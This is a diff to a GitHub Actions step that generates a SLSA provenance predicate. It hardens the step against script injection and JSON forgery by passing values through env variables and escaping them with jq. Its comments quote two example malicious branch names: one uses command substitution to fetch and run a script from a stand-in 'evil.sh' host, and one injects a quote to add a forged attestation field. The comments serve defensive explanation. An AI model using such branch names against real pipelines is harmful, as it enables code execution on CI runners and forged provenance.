@@ -25,28 +25,60 @@ runs:
   steps:
     - name: Generate SLSA predicate
       shell: bash
+      env:
+        # Every value reaches the script through env, never as an inline ${{ }}
+        # inside the run block. Actions substitutes an expression into the script
+        # TEXT before bash parses it, so a shell-active branch name is executed
+        # rather than recorded: `git check-ref-format --branch 'feat/a$(id)b'`
+        # exits 0, and ${IFS} sidesteps the no-space rule, which makes
+        # `feat/x$(curl${IFS}evil.sh|sh)y` a valid branch name. A value read back
+        # as $VAR is expanded but not re-scanned, so its content cannot execute.
+        GH_REPOSITORY: ${{ github.repository }}
+        GH_REF: ${{ github.ref }}
+        GH_SHA: ${{ github.sha }}
+        GH_RUN_ID: ${{ github.run_id }}
+        WORKFLOW_FILE: ${{ inputs.workflow_file }}
       run: |
         set -euo pipefail
         PREDICATE="${RUNNER_TEMP}/slsa-predicate.json"
+
+        # Env indirection stops execution but not JSON forgery: a double quote is
+        # a legal ref character (`git check-ref-format --branch 'feat/a"b'` exits
+        # 0), so a branch named `a", "malicious": "x` would close the string early
+        # and graft an attacker-chosen field onto this attestation. jq --arg
+        # renders a value as a complete, escaped JSON string literal, quotes
+        # included, so the template below interpolates the literals bare. For a
+        # value with nothing to escape the result is byte-identical to the old
+        # inline form, which keeps the emitted predicate unchanged in practice.
+        json_string() {
+          jq -n --arg value "$1" '$value'
+        }
+        J_REPOSITORY="$(json_string "${GH_REPOSITORY}")"
+        J_REF="$(json_string "${GH_REF}")"
+        J_SHA="$(json_string "${GH_SHA}")"
+        J_URI="$(json_string "git+https://github.com/${GH_REPOSITORY}@${GH_REF}")"
+        J_BUILDER_ID="$(json_string "https://github.com/${GH_REPOSITORY}/.github/workflows/${WORKFLOW_FILE}")"
+        J_INVOCATION_ID="$(json_string "https://github.com/${GH_REPOSITORY}/actions/runs/${GH_RUN_ID}")"
+
         cat > "$PREDICATE" <<-EOF
         {
           "buildDefinition": {
             "buildType": "https://aicr.run/binary/v1",
             "externalParameters": {
-              "repository": "${{ github.repository }}",
-              "ref": "${{ github.ref }}"
+              "repository": ${J_REPOSITORY},
+              "ref": ${J_REF}
             },
             "resolvedDependencies": [{
-              "uri": "git+https://github.com/${{ github.repository }}@${{ github.ref }}",
-              "digest": { "gitCommit": "${{ github.sha }}" }
+              "uri": ${J_URI},
+              "digest": { "gitCommit": ${J_SHA} }
             }]
           },
           "runDetails": {
             "builder": {
-              "id": "https://github.com/${{ github.repository }}/.github/workflows/${{ inputs.workflow_file }}"
+              "id": ${J_BUILDER_ID}
             },
             "metadata": {
-              "invocationId": "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+              "invocationId": ${J_INVOCATION_ID}
             }
           }
         }
